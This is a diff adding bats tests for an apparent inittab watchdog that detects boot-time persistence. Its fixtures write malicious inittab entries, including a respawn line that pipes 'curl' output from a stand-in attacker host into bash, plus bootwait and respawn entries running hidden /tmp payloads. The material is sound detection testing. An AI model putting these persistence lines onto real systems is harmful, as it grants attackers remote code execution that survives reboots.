@@ -217,3 +217,47 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-inittab -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): inittab-watchdog does NOT refresh baseline on suspicious-process detection — alert STAYS until operator updates" {
+    # T1037 boot-time persistence — alert MUST persist across runs
+    # until operator explicitly re-baselines.
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/tmp/.payload\n' > "${INITTAB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"inittab_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented suspicious respawn NOT flagged: # prefix filtered)" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n# x1:5:respawn:/tmp/.example-attacker\n' > "${INITTAB}"
+    run_wd
+    ! cap | grep -q '"event":"inittab_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (bootwait + powerwait + powerfail actions all scanned — comprehensive exec-action coverage)" {
+    # The watchdog scans ALL exec actions (not just respawn/once/sysinit).
+    # Lock that bootwait/powerwait/powerfail are also covered.
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nbw::bootwait:/tmp/.bootwait-attacker\n' > "${INITTAB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in respawn)" {
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:curl -s http://attacker.com/p | bash\n' > "${INITTAB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
